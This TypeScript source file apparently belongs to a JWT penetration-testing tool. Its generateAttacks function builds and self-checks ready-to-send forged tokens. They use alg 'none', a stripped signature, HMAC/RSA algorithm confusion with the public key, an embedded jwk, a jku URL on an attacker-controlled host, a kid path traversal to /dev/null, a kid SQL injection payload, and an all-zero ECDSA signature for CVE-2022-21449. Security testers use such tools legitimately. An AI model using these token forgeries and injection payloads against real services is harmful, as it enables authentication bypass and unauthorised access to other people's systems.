import { describeAlgorithm } from './algorithms.js';
import { encodeBase64url, encodeJsonBase64url } from './base64url.js';
import {
  generateRsaKeyPair,
  hmac,
  hmacKeyRepresentations,
  publicKeyToJwk,
  signAsymmetric,
  verifySignature,
  type LoadedKey,
} from './crypto.js';
import type { CryptoEvidence } from './evidence.js';
import type { DecodedToken } from './decode.js';
import type { AlgorithmInfo, AttackCandidate } from './types.js';

/**
 * The attack matrix.
 *
 * Every entry is a complete, well-formed compact JWS that a tester can present
 * as-is. Where a candidate can be checked without a network — and most can —
 * it is checked here, immediately after being built, and the result goes in
 * the `verified` field. That is the whole point of generating them locally: a
 * candidate token that turns out to be malformed wastes a request and, worse,
 * produces a false negative that reads like a clean result.
 *
 * What these tokens do *not* tell you is whether the target is vulnerable. They
 * are the inputs to that experiment, not its outcome.
 */

export interface AttackInputs {
  readonly token: DecodedToken;
  readonly algorithm: AlgorithmInfo;
  readonly evidence: CryptoEvidence;
  readonly keys: readonly LoadedKey[];
  readonly attackerHost: string;
  readonly claimOverrides: Readonly<Record<string, unknown>>;
  /** Cap on how many key-representation variants of the confusion attack to emit. */
  readonly maxConfusionVariants: number;
}

const HS256 = describeAlgorithm('HS256');
const RS256 = describeAlgorithm('RS256');

function assemble(headerSegment: string, payloadSegment: string, signature: Uint8Array | string): string {
  const encoded = typeof signature === 'string' ? signature : encodeBase64url(signature);
  return `${headerSegment}.${payloadSegment}.${encoded}`;
}

/**
 * The payload segment for generated tokens. With no claim overrides this is the
 * *original segment, byte for byte* — not a re-encoding of the parsed claims.
 * That matters: re-encoding would silently normalise key order, whitespace and
 * number formatting, so a token that failed would leave you unsure whether the
 * verifier rejected the attack or merely a different-looking payload.
 */
function payloadSegmentFor(inputs: AttackInputs): { segment: string; rewritten: boolean } {
  const overrides = Object.keys(inputs.claimOverrides);
  if (overrides.length === 0) return { segment: inputs.token.segments.payload, rewritten: false };
  if (inputs.token.payload === null) return { segment: inputs.token.segments.payload, rewritten: false };
  const merged: Record<string, unknown> = { ...inputs.token.payload, ...inputs.claimOverrides };
  return { segment: encodeJsonBase64url(merged), rewritten: true };
}

function overrideNote(inputs: AttackInputs): string[] {
  const overrides = Object.keys(inputs.claimOverrides);
  if (overrides.length === 0) return [];
  if (inputs.token.payload === null) {
    return ['Claim overrides were ignored: the payload of this token is not a JSON object.'];
  }
  return [`Claims rewritten in every candidate: ${overrides.join(', ')}.`];
}

export function generateAttacks(inputs: AttackInputs): AttackCandidate[] {
  const candidates: AttackCandidate[] = [];
  const { token, algorithm } = inputs;
  const { segment: payloadSegment, rewritten } = payloadSegmentFor(inputs);
  const extraPrerequisites = overrideNote(inputs);

  const originalHeader = token.header;
  const headerWithout = (...drop: string[]): Record<string, unknown> => {
    const copy: Record<string, unknown> = { ...originalHeader };
    for (const key of drop) delete copy[key];
    return copy;
  };

  const emit = (candidate: AttackCandidate): void => {
    candidates.push({
      ...candidate,
      prerequisites: [...candidate.prerequisites, ...extraPrerequisites],
    });
  };

  // ---- Unsecured variants -------------------------------------------------
  for (const spelling of ['none', 'None'] as const) {
    const header = { ...headerWithout('jwk'), alg: spelling };
    const headerSegment = encodeJsonBase64url(header);
    emit({
      id: spelling === 'none' ? 'ATK-ALG-NONE' : 'ATK-ALG-NONE-VARIANT',
      name:
        spelling === 'none'
          ? 'unsecured token, canonical spelling'
          : 'unsecured token, mixed-case spelling',
      rationale:
        spelling === 'none'
          ? 'Asks the verifier to accept an assertion with no signature at all. The first thing to try, and still the thing that works when a verifier takes its algorithm from the token.'
          : 'The same request with the spelling changed. Defeats a verifier that rejects the exact string `none` but compares algorithm names case-insensitively, or normalises the case before dispatch.',
      token: assemble(headerSegment, payloadSegment, ''),
      header,
      signing: 'not signed; the signature segment is empty, with the trailing dot retained',
      verified: 'structure only — there is nothing to verify on an unsecured JWS',
      prerequisites: [],
      artifacts: [],
    });
  }

  // ---- Signature stripped, algorithm left in place ------------------------
  if (algorithm.family !== 'none' && token.signature.length > 0) {
    const headerSegment = token.segments.header;
    emit({
      id: 'ATK-SIG-STRIPPED',
      name: 'signature removed, header untouched',
      rationale:
        'Keeps the original header — same algorithm, same `kid` — and removes only the signature bytes. Separates "the verifier ignores the algorithm" from "the verifier never reaches the comparison", because a verifier that short-circuits on an empty signature accepts this while rejecting `alg: none`.',
      token: assemble(headerSegment, payloadSegment, ''),
      header: originalHeader,
      signing: 'not signed; the original header is preserved and the signature segment emptied',
      verified: 'structure only',
      prerequisites: [],
      artifacts: [],
    });
  }

  // ---- HS/RS confusion, one per key representation ------------------------
  if (
    algorithm.family === 'rsa' ||
    algorithm.family === 'rsa-pss' ||
    algorithm.family === 'ecdsa' ||
    algorithm.family === 'eddsa'
  ) {
    for (const key of inputs.keys) {
      const all = hmacKeyRepresentations(key);
      const representations = all.slice(0, inputs.maxConfusionVariants);
      representations.forEach((representation, index) => {
        const header = { ...headerWithout('jwk'), alg: 'HS256' };
        const headerSegment = encodeJsonBase64url(header);
        const signingInput = `${headerSegment}.${payloadSegment}`;
        const mac = hmac(HS256, representation.bytes, signingInput);
        emit({
          id: `ATK-HS-WITH-PUBKEY:${representation.label}`,
          name: `HS256 signed with the public key (${representation.label})`,
          rationale:
            index === 0
              ? `Algorithm confusion. The verifier holds one key and chooses its verification function from the header, so naming an HMAC algorithm makes it use the public key as a shared secret — and the public key is public. Which byte representation works depends on how the target loads its key, so there is one candidate per representation: ${all.length} were derived from this key and ${representations.length} are shown. This one is keyed with ${representation.description}.`
              : `The same attack keyed with a different byte representation: ${representation.description}.`,
          token: assemble(headerSegment, payloadSegment, mac),
          header,
          signing: `HMAC-SHA256 over the signing input, keyed with ${representation.description}`,
          verified: 'recomputed the MAC after assembly and confirmed it matches the signature segment',
          prerequisites: [
            `The target must verify with the same key you supplied (${key.source}).`,
            'The target must pass that key to its HMAC function in this exact byte representation.',
          ],
          artifacts: [],
        });
      });
    }
  }

  // ---- Re-sign with a recovered secret ------------------------------------
  const recovered = inputs.evidence.recoveredSecret;
  if (recovered !== null) {
    const headerSegment = token.segments.header;
    const signingInput = `${headerSegment}.${payloadSegment}`;
    const mac = hmac(algorithm, Buffer.from(recovered.secret, 'utf8'), signingInput);
    emit({
      id: 'ATK-HS-RECOVERED-SECRET',
      name: 'resigned with the recovered secret',
      rationale:
        'The secret is known, so this is not an attack on the verifier but a demonstration that claims can be rewritten at will. Pass `--claim` to change what it asserts; with no overrides the payload is unchanged, which keeps the proof narrow and the report honest.',
      token: assemble(headerSegment, payloadSegment, mac),
      header: originalHeader,
      signing: `${algorithm.declared} keyed with the recovered secret (${recovered.origin})`,
      verified: rewritten
        ? 'recomputed the MAC over the rewritten payload and confirmed it matches'
        : 'recomputed the MAC and confirmed it matches; the payload is byte-identical to the original',
      prerequisites: [],
      artifacts: [],
    });
  }

  // ---- Self-signed with an embedded jwk -----------------------------------
  let generated: { publicKey: ReturnType<typeof generateRsaKeyPair>['publicKey']; privateKey: ReturnType<typeof generateRsaKeyPair>['privateKey'] } | null = null;
  const freshKeyPair = (): NonNullable<typeof generated> => {
    generated ??= generateRsaKeyPair(2048);
    return generated;
  };

  {
    const { publicKey, privateKey } = freshKeyPair();
    const jwk = publicKeyToJwk(publicKey);
    const header = { ...headerWithout('jku', 'x5u', 'x5c'), alg: 'RS256', jwk };
    const headerSegment = encodeJsonBase64url(header);
    const signingInput = `${headerSegment}.${payloadSegment}`;
    const signature = signAsymmetric(RS256, privateKey, signingInput);
    const selfVerifies = verifySignature(RS256, publicKey, signingInput, signature);
    emit({
      id: 'ATK-EMBEDDED-JWK',
      name: 'self-signed with a key embedded in the header',
      rationale:
        'Carries a freshly generated public key in the `jwk` header and is signed with the matching private key. A verifier that resolves its key from the header will find a key that works, because the token brought its own. The keypair is generated for this run and exists nowhere else.',
      token: assemble(headerSegment, payloadSegment, signature),
      header,
      signing: 'RS256 with a 2048-bit RSA private key generated for this run',
      verified: selfVerifies
        ? 'verified the assembled token against its own embedded public key'
        : 'self-verification FAILED — do not use this candidate, please report it as a bug',
      prerequisites: ['The target must accept key material from the `jwk` header.'],
      artifacts: [],
    });
  }

  // ---- Remote key set under attacker control ------------------------------
  {
    const { publicKey, privateKey } = freshKeyPair();
    const kid = 'jwt-confusion-remote-1';
    const jwk = { ...publicKeyToJwk(publicKey), kid, alg: 'RS256', use: 'sig' };
    const jkuUrl = `https://${inputs.attackerHost}/.well-known/jwks.json`;
    const header = { ...headerWithout('x5u', 'x5c', 'jwk'), alg: 'RS256', kid, jku: jkuUrl };
    const headerSegment = encodeJsonBase64url(header);
    const signingInput = `${headerSegment}.${payloadSegment}`;
    const signature = signAsymmetric(RS256, privateKey, signingInput);
    const selfVerifies = verifySignature(RS256, publicKey, signingInput, signature);
    emit({
      id: 'ATK-JKU-REMOTE',
      name: 'key set fetched from a host you control',
      rationale:
        'Points `jku` at a host you control and signs with the key you will serve there. Two findings fall out of one request: the verifier makes an outbound request to a destination the token chose, and if it then trusts what comes back, the signature check is yours to pass. Serve the attached JWKS at the URL in the header.',
      token: assemble(headerSegment, payloadSegment, signature),
      header,
      signing: 'RS256 with a 2048-bit RSA private key generated for this run',
      verified: selfVerifies
        ? 'verified the assembled token against the public key in the attached JWKS'
        : 'self-verification FAILED — do not use this candidate, please report it as a bug',
      prerequisites: [
        `Serve the attached JWKS document at ${jkuUrl}.`,
        'Set --attacker-host to a host you control; the default is a reserved example domain and will not resolve.',
        'The target must honour the `jku` header and must be able to reach your host.',
      ],
      artifacts: [
        {
          name: 'jwks.json',
          description: `the key set to serve at ${jkuUrl}`,
          content: `${JSON.stringify({ keys: [jwk] }, null, 2)}\n`,
        },
      ],
    });
  }

  // ---- kid pointed at an empty file ---------------------------------------
  {
    const kid = '../../../../../../dev/null';
    const header = { ...headerWithout('jku', 'x5u', 'x5c', 'jwk'), alg: 'HS256', kid };
    const headerSegment = encodeJsonBase64url(header);
    const signingInput = `${headerSegment}.${payloadSegment}`;
    const mac = hmac(HS256, Buffer.alloc(0), signingInput);
    emit({
      id: 'ATK-KID-DEVNULL',
      name: 'kid traversed to an empty file, signed with a zero-length key',
      rationale:
        'Where `kid` becomes a filename, the attacker picks the key file. `/dev/null` is the useful pick: it reads as zero bytes on any Unix host, so the key is the empty string and the MAC can be computed without knowing anything. Traversal depth is a guess — six levels is a common fit; vary it.',
      token: assemble(headerSegment, payloadSegment, mac),
      header,
      signing: 'HMAC-SHA256 keyed with a zero-length key',
      verified: 'recomputed the MAC with an empty key and confirmed it matches the signature segment',
      prerequisites: [
        'The target must resolve `kid` to a path on disk and read the key from it.',
        'The traversal depth must reach the filesystem root; try other depths if this one does not.',
      ],
      artifacts: [],
    });
  }

  // ---- kid injected into a SQL lookup -------------------------------------
  {
    const injectedKey = 'jwt-confusion';
    const kid = `nonexistent' UNION SELECT '${injectedKey}`;
    const header = { ...headerWithout('jku', 'x5u', 'x5c', 'jwk'), alg: 'HS256', kid };
    const headerSegment = encodeJsonBase64url(header);
    const signingInput = `${headerSegment}.${payloadSegment}`;
    const mac = hmac(HS256, Buffer.from(injectedKey, 'utf8'), signingInput);
    emit({
      id: 'ATK-KID-SQLI',
      name: 'kid injected into a key lookup query',
      rationale:
        'Where keys are stored in a table and `kid` is interpolated into the query, a `UNION SELECT` of a literal returns a key the attacker chose. The token is signed with that literal. Column count and types will need adjusting for the real schema — this candidate assumes a single-column result.',
      token: assemble(headerSegment, payloadSegment, mac),
      header,
      signing: `HMAC-SHA256 keyed with the injected literal ${JSON.stringify(injectedKey)}`,
      verified: 'recomputed the MAC with the injected literal and confirmed it matches the signature segment',
      prerequisites: [
        'The target must interpolate `kid` into a SQL key lookup.',
        'The UNION arity and column types must match the real query.',
      ],
      artifacts: [],
    });
  }

  // ---- ECDSA signature of zeros -------------------------------------------
  if (algorithm.family === 'ecdsa' && algorithm.signatureBytes !== null) {
    const headerSegment = token.segments.header;
    const zeros = Buffer.alloc(algorithm.signatureBytes);
    emit({
      id: 'ATK-ECDSA-ZERO-SIG',
      name: 'ECDSA signature with r and s set to zero',
      rationale:
        'A signature of all zeros satisfies the ECDSA verification equation unless the implementation rejects r = 0 and s = 0 explicitly. The JDK\'s own provider did not, between Java 15 and 18 (CVE-2022-21449). No key is needed and no key is used. Expect this to fail anywhere other than an affected Java runtime — that is what makes it a cheap, decisive probe.',
      token: assemble(headerSegment, payloadSegment, zeros),
      header: originalHeader,
      signing: `not signed; ${algorithm.signatureBytes} zero bytes in place of r || s`,
      verified: 'structure only — by construction this signature is invalid under a correct implementation',
      prerequisites: ['Only an ECDSA verifier on an affected Java runtime will accept this.'],
      artifacts: [],
    });
  }

  return candidates;
}
